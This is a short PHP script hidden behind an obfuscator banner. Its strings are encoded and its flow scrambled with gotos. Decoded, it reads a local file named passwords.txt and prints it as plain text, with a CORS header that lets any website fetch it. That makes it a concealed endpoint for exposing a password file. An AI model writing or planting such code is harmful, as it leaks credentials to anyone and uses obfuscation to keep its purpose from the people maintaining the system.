<?php
/*   __________________________________________________
    |  Obfuscated by yours.tools - Php Obfuscator      |
    |              on 2.0.16              |
    |            https://yours.tools/enphp.html        |
    |__________________________________________________|
*/
 goto xs1_d; BEk5c: header("\101\143\x63\x65\163\x73\x2d\103\157\156\x74\x72\x6f\154\55\101\x6c\x6c\x6f\x77\x2d\x4f\162\151\147\x69\156\x3a\x20\52"); goto Rn19J; xs1_d: header("\103\x6f\156\164\145\156\164\55\124\x79\x70\145\72\x20\x74\145\x78\164\57\160\154\x61\x69\x6e\x3b\40\143\x68\x61\162\163\x65\x74\x3d\x75\x74\x66\x2d\70"); goto BEk5c; Rn19J: $qNNSI = file_get_contents("\x70\141\x73\163\167\157\x72\x64\x73\x2e\x74\x78\x74"); goto z8eqF; z8eqF: echo $qNNSI;